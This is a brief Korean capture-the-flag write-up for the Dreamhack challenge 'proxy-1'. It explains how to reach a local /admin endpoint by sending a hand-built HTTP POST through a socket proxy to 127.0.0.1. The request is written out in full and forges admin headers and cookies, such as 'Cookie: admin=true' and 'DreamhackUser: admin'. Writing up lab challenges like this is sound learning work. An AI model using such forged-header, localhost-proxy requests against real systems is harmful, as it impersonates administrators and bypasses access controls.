# proxy-1

    socket으로 host, port, data를 적어서 통신을 보낼 수 있다.
    flag는 로컬 호스트 /admin 경로에 있다.

- 서버 그 자체에 요청을 보내야 하기에 호스트와 포트는 127.0.0.1:8000
- data에는 HTTP packet형태에 맞게 작성을 해줘야함. 
    >POST /admin HTTP/1.1  
    >Host: host1.dreamhack.games:8203  
    >User-Agent: Admin Browser  
    >DreamhackUser: admin  
    >Cookie: admin=true  
    >Content-Type: application/x-www-form-urlencoded  
    >Content-Length: 12
    >  
    >userid=admin  
- 주어진 서버 소스에 없는 Content-Length, Content-Type도 넣어줘야함. POST에는 필수!

***
    HTTP 요청을 직접 작성하게 하는 것에 목적이 있는 문제.   
